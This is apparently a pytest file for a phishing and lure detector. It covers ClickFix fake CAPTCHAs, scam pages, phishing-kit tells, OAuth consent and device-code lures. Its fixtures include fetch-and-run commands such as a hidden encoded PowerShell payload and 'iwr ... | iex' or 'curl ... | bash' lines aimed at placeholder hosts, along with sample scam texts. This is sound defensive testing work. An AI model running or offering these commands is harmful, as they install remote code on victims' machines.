"""``analysis.lures``: ClickFix, scam pages, phishing-kit tells, free hosting,
open redirects, device-code / OAuth consent / callback lures, hidden
characters. Positive and negative cases for every detector."""

from __future__ import annotations

import pytest

from reddysec.analysis import lures
from reddysec.analysis.dynamic import dynamic_signals, url_static_signals
from reddysec.analysis.intel import OfflineIntel
from reddysec.analysis.parser import parse_raw
from reddysec.analysis.urls import build_url
from reddysec.models import FormRecord, NetworkRequest, UrlSource

from .support import RECEIVED_AT, build_raw, ok_result

ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
PAYLOAD = f"powershell -w hidden -enc {ENC} # I am not a robot - reCAPTCHA Verification ID: 4821"
STEPS = "Verification Steps\nPress Windows Button + R\nPress CTRL + V\nPress Enter"


def page(text="", clipboard=None, **features):
    result = ok_result(final_url="https://verify-check.example/", final_host="verify-check.example")
    f = result.features
    f.text_excerpt = text
    f.clipboard_writes = list(clipboard or [])
    for key, value in features.items():
        setattr(f, key, value)
    return result


def codes(signals) -> dict[str, int]:
    return {s.code: s.weight for s in signals}


URL = "https://verify-check.example/"


class TestClickFix:
    def test_clipboard_payload_plus_run_dialog_steps(self):
        sigs = lures.clickfix_signals(URL, page("I'm not a robot\n" + STEPS, [PAYLOAD]))
        assert codes(sigs) == {"dynamic.clickfix": 100}
        assert sigs[0].evidence["where"] == "the Windows Run box"
        assert "powershell_encoded" in sigs[0].evidence["families"]

    def test_filefix_place(self):
        text = "Open File Explorer, click the address bar and press CTRL + V"
        sigs = lures.clickfix_signals(URL, page(text, ['powershell -c "iwr https://x | iex"   # C:\\HR\\Policy.docx']))
        assert sigs[0].code == "dynamic.clickfix" and sigs[0].evidence["where"] == "the File Explorer address bar"

    def test_macos_terminal_place(self):
        text = "Verify you are human: press Command + Space, type Terminal, paste with Command + V"
        sigs = lures.clickfix_signals(URL, page(text, ['/bin/bash -c "$(curl -fsSL https://x/i.sh)"']))
        assert sigs[0].code == "dynamic.clickfix" and sigs[0].evidence["where"] == "the Terminal"

    def test_payload_with_decoy_comment_but_steps_in_an_image(self):
        sigs = lures.clickfix_signals(URL, page("", [PAYLOAD]))
        assert codes(sigs) == {"dynamic.clickfix": 100}

    def test_payload_without_any_instructions_is_a_hijack(self):
        sigs = lures.clickfix_signals(URL, page("Welcome", [f"powershell -w hidden -enc {ENC}"]))
        assert codes(sigs) == {"dynamic.clipboard_hijack": 90}

    def test_shown_command_inside_fake_error(self):
        text = ("Word Online extension is not installed. How to fix:\nOpen PowerShell and paste this, then press Enter:\n"
                "iwr https://fix.example/w.ps1 | iex")
        assert codes(lures.clickfix_signals(URL, page(text))) == {"dynamic.clickfix": 100}

    def test_fake_captcha_without_payload(self):
        sigs = lures.clickfix_signals(URL, page("I'm not a robot\n" + STEPS))
        assert codes(sigs) == {"dynamic.fake_captcha": 40}

    def test_chamber_flag_alone_counts(self):
        assert codes(lures.clickfix_signals(URL, page("", fake_captcha=True))) == {"dynamic.fake_captcha": 40}

    # -- negatives -----------------------------------------------------------------
    def test_real_captcha_page(self):
        result = page("Create your account\nPlease confirm you are not a robot.", captcha_detected=True,
                      captcha_providers=["recaptcha"])
        assert lures.clickfix_signals(URL, result) == []

    def test_install_docs_with_snippet(self):
        text = ("Install the CLI\nOpen PowerShell and paste the following command, then press Enter:\n"
                "iwr https://get.example.dev/install.ps1 | iex\nOn macOS open Terminal and run "
                '/bin/bash -c "$(curl -fsSL https://get.example.dev/install.sh)"')
        assert lures.clickfix_signals(URL, page(text)) == []

    def test_install_docs_paste_wording_with_harmless_clipboard(self):
        text = "Open PowerShell and paste the following command, then press Enter"
        assert lures.clickfix_signals(URL, page(text, ["Get-Date"])) == []

    def test_winver_help_article(self):
        text = "To see your Windows version, press Windows + R, type winver and press Enter."
        assert lures.clickfix_signals(URL, page(text)) == []

    def test_no_features(self):
        result = page()
        result.features = None
        assert lures.clickfix_signals(URL, result) == []


class TestScamPages:
    def test_tech_support(self):
        text = "Access to this PC has been blocked. Call Microsoft Support +1 (888) 555-0199"
        result = page(text, fullscreen_requested=True, dialog_count=3)
        sigs = lures.scam_page_signals(URL, result, "verify-check.example", False)
        assert codes(sigs) == {"dynamic.tech_support_scam": 80}
        assert sigs[0].evidence["phones"] == ["+1 (888) 555-0199"]

    def test_support_page_of_a_real_shop_is_not_a_scam(self):
        text = "Questions about your order? Call customer support at (800) 555-0100, Monday to Friday."
        assert lures.scam_page_signals(URL, page(text), "shop.example", False) == []

    def test_scam_text_on_popular_site_is_ignored(self):
        text = "Your computer has been locked. Call Microsoft Support +1 (888) 555-0199"
        assert lures.scam_page_signals(URL, page(text, fullscreen_requested=True), "microsoft.com", True) == []

    def test_wallet_drainer_by_request(self):
        result = page("Connect wallet to claim your airdrop", wallet_requests=["eth_requestAccounts"])
        assert codes(lures.scam_page_signals(URL, result, "claim.example", False)) == {"dynamic.wallet_drainer": 85}

    def test_wallet_drainer_by_seed_phrase_box(self):
        result = page("Restore your wallet: enter your secret recovery phrase", seed_phrase_inputs=12)
        assert "dynamic.wallet_drainer" in codes(lures.scam_page_signals(URL, result, "x.example", False))

    def test_passive_wallet_probe_is_not_a_drainer(self):
        result = page("Our NFT gallery", wallet_requests=["eth_chainId", "eth_accounts"])
        assert lures.scam_page_signals(URL, result, "x.example", False) == []

    def test_notification_permission(self):
        result = page("Click Allow", notification_permission_requested=True)
        assert codes(lures.scam_page_signals(URL, result, "x.example", False)) == {"dynamic.notification_spam": 25}
        assert lures.scam_page_signals(URL, result, "news.example", True) == []


class TestKitSignals:
    def _login(self, **kw):
        result = page("Sign in", has_password_field=True, **kw)
        result.features.forms = [FormRecord(has_password=True, has_identity_field=True)]
        return result

    def test_microsoft_assets_on_other_host(self):
        result = self._login()
        result.requests = [NetworkRequest(url="https://aadcdn.msftauth.net/shared/1.0/content/js/x.js", host="aadcdn.msftauth.net")]
        sigs = lures.kit_signals(URL, result, final_host="verify-check.example", final_rd="verify-check.example", final_popular=False)
        assert codes(sigs)["dynamic.aitm_proxy"] == 70

    def test_proxied_asset_paths_on_own_host(self):
        result = self._login()
        result.requests = [NetworkRequest(url="https://verify-check.example/shared/1.0/content/js/ConvergedLogin_PCore.js",
                                          host="verify-check.example")]
        sigs = lures.kit_signals(URL, result, final_host="verify-check.example", final_rd="verify-check.example", final_popular=False)
        assert "dynamic.aitm_proxy" in codes(sigs)

    def test_microsoft_own_login_is_not_aitm(self):
        result = self._login()
        result.requests = [NetworkRequest(url="https://aadcdn.msftauth.net/shared/1.0/content/js/x.js", host="aadcdn.msftauth.net")]
        sigs = lures.kit_signals(URL, result, final_host="login.microsoftonline.com", final_rd="microsoftonline.com", final_popular=True)
        assert "dynamic.aitm_proxy" not in codes(sigs)

    def test_microsoft_assets_without_a_login_form(self):
        result = page("Hello")
        result.requests = [NetworkRequest(url="https://aadcdn.msftauth.net/x.png", host="aadcdn.msftauth.net")]
        sigs = lures.kit_signals(URL, result, final_host="x.example", final_rd="x.example", final_popular=False)
        assert "dynamic.aitm_proxy" not in codes(sigs)

    def test_turnstile_gate_in_front_of_login(self):
        result = self._login(captcha_detected=True, captcha_providers=["turnstile"])
        sigs = lures.kit_signals(URL, result, final_host="x.example", final_rd="x.example", final_popular=False)
        assert codes(sigs)["dynamic.captcha_gated_login"] == 30

    def test_recaptcha_on_login_is_not_a_gate(self):
        result = self._login(captcha_detected=True, captcha_providers=["recaptcha"])
        sigs = lures.kit_signals(URL, result, final_host="x.example", final_rd="x.example", final_popular=False)
        assert "dynamic.captcha_gated_login" not in codes(sigs)

    def test_anti_debug_and_cloaking(self):
        result = page("", anti_debug=True, ua_cloaking=True)
        sigs = lures.kit_signals(URL, result, final_host="x.example", final_rd="x.example", final_popular=False)
        assert codes(sigs) == {"dynamic.anti_analysis": 25, "dynamic.ua_cloaking": 20}

    def test_free_hosting_login(self):
        result = self._login(final_url="https://m365-verify.pages.dev/login")
        sigs = lures.kit_signals("https://m365-verify.pages.dev/login", result, final_host="m365-verify.pages.dev",
                                 final_rd="m365-verify.pages.dev", final_popular=False)
        assert codes(sigs)["dynamic.free_hosting_login"] == 60

    def test_free_hosting_without_login_or_brand(self):
        result = page("My portfolio", final_url="https://jane.github.io/")
        sigs = lures.kit_signals("https://jane.github.io/", result, final_host="jane.github.io",
                                 final_rd="jane.github.io", final_popular=False)
        assert "dynamic.free_hosting_login" not in codes(sigs)

    def test_device_code_on_page(self):
        result = page("Go to microsoft.com/devicelogin and enter the code GHK7-PQ2X to join the meeting")
        sigs = lures.kit_signals(URL, result, final_host="x.example", final_rd="x.example", final_popular=False)
        assert codes(sigs)["dynamic.device_code_lure"] == 70


def url(raw, display=None):
    return build_url(raw, UrlSource.HTML_HREF, display)


class TestStaticLinkSignals:
    def test_google_open_redirect_is_unwrapped(self):
        u = url("https://www.google.com/url?q=https://evil-login.example/x&sa=D")
        assert u.normalized == "https://evil-login.example/x"
        sigs = lures.redirect_signals(u)
        assert codes(sigs) == {"url.open_redirect": 20}
        assert sigs[0].evidence["chain"][0].startswith("https://www.google.com/url")

    def test_open_redirect_to_popular_site_is_ordinary(self):
        assert lures.redirect_signals(url("https://www.google.com/url?q=https://www.youtube.com/watch?v=1")) == []

    def test_safe_links_are_not_open_redirects(self):
        u = url("https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Funknown.example%2F&data=1")
        assert u.normalized == "https://unknown.example/" and lures.redirect_signals(u) == []

    def test_linkedin_slink_hides_destination(self):
        assert codes(lures.redirect_signals(url("https://www.linkedin.com/slink?code=abc123"))) == {"url.open_redirect": 10}

    def test_plain_link(self):
        assert lures.redirect_signals(url("https://example.com/")) == []

    def test_free_hosting(self):
        assert codes(lures.free_hosting_signals(url("https://docs-share.workers.dev/view"))) == {"url.free_hosting": 12}
        assert codes(lures.free_hosting_signals(url("https://docs.google.com/forms/d/e/1/viewform"))) == {"url.free_hosting": 12}
        assert lures.free_hosting_signals(url("https://docs.google.com/document/d/1/edit")) == []
        assert lures.free_hosting_signals(url("https://www.walmart.com/")) == []

    def test_oauth_consent_with_mail_scopes(self):
        u = url("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=abc&response_type=code"
                "&scope=offline_access%20Mail.ReadWrite%20Files.ReadWrite.All&redirect_uri=https://app.example/cb")
        sigs = lures.oauth_consent_signals(u)
        assert codes(sigs) == {"url.oauth_consent_lure": 50}
        assert "mail.readwrite" in sigs[0].evidence["scopes"]

    def test_oauth_redirect_abuse(self):
        u = url("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=abc&scope=openid"
                "&prompt=none&redirect_uri=https://phish.example/landing")
        assert codes(lures.oauth_consent_signals(u)) == {"url.oauth_consent_lure": 50}

    def test_google_gmail_scope(self):
        u = url("https://accounts.google.com/o/oauth2/v2/auth?client_id=1.apps.googleusercontent.com"
                "&scope=https://www.googleapis.com/auth/gmail.modify&redirect_uri=https://www.example.com/cb")
        assert "url.oauth_consent_lure" in codes(lures.oauth_consent_signals(u))

    def test_ordinary_sign_in_with_google(self):
        u = url("https://accounts.google.com/o/oauth2/v2/auth?client_id=1.apps.googleusercontent.com"
                "&scope=openid%20email%20profile&redirect_uri=https://accounts.spotify.com/cb")
        assert lures.oauth_consent_signals(u) == []

    def test_not_an_oauth_url(self):
        assert lures.oauth_consent_signals(url("https://login.microsoftonline.com/")) == []

    def test_hidden_characters_in_link_text(self):
        assert codes(lures.link_text_signals(url("https://x.example/", "Pay\u200bPal account"))) == {"url.hidden_characters": 20}
        assert lures.link_text_signals(url("https://x.example/", "PayPal account")) == []
        assert lures.hidden_characters("a\u202eb") == ["right-to-left"]

    async def test_static_signals_include_lure_checks(self):
        sigs = await url_static_signals(url("https://www.google.com/url?q=https://m365.pages.dev/x"), OfflineIntel())
        assert {"url.open_redirect", "url.free_hosting"} <= {s.code for s in sigs}


def parse(**kw):
    return parse_raw(build_raw(**kw), provider_message_id="pm", mailbox_id="mbx", received_at=RECEIVED_AT)


class TestEmailLures:
    def test_device_code_email(self):
        p = parse(subject="Teams meeting", text="Join the board meeting: go to https://microsoft.com/devicelogin "
                                                 "and enter code GHK7PQ2XA when asked.")
        assert codes(lures.email_lure_signals(p, p.text_body)) == {"bec.device_code_lure": 70}

    def test_device_url_without_a_code(self):
        p = parse(text="You can sign in on your TV at microsoft.com/devicelogin whenever you like.")
        assert lures.email_lure_signals(p, p.text_body) == []

    def test_callback_scam(self):
        p = parse(from_header="Geek Squad <billing.geeksquad@gmail.com>", subject="Your subscription has been renewed",
                  text="Your annual plan has been charged $499.99. Order ID: GS-88213. If you did not authorize this "
                       "renewal, call our billing department at +1 (808) 555-0142 to cancel and get a refund.")
        sigs = lures.email_lure_signals(p, p.text_body)
        assert codes(sigs) == {"bec.callback_scam": 55}
        assert sigs[0].evidence["phones"] == ["+1 (808) 555-0142"]

    def test_real_receipt_with_links_is_not_callback(self):
        text = ("Your subscription has been renewed and charged $9.99. Manage it at https://shop.example/account "
                "or https://shop.example/help. To cancel, call (800) 555-0100.")
        p = parse(text=text)
        assert lures.email_lure_signals(p, p.text_body) == []

    def test_phone_number_without_renewal(self):
        p = parse(text="Call me at (212) 555-0100 to cancel lunch.")
        assert lures.email_lure_signals(p, p.text_body) == []


class TestDynamicIntegration:
    def test_dynamic_signals_carry_lure_codes(self):
        result = page("I'm not a robot\n" + STEPS, [PAYLOAD])
        assert "dynamic.clickfix" in {s.code for s in dynamic_signals(URL, result, None)}

    @pytest.mark.parametrize("kind", ["iso9660", "lnk", "msi"])
    def test_dangerous_download_kinds(self, kind):
        from reddysec.models import DownloadRecord

        result = ok_result(downloads=[DownloadRecord(suggested_filename="file.bin", sha256="0" * 64, size=1, sniffed_type=kind)])
        assert "dynamic.dangerous_download" in {s.code for s in dynamic_signals(URL, result, None)}
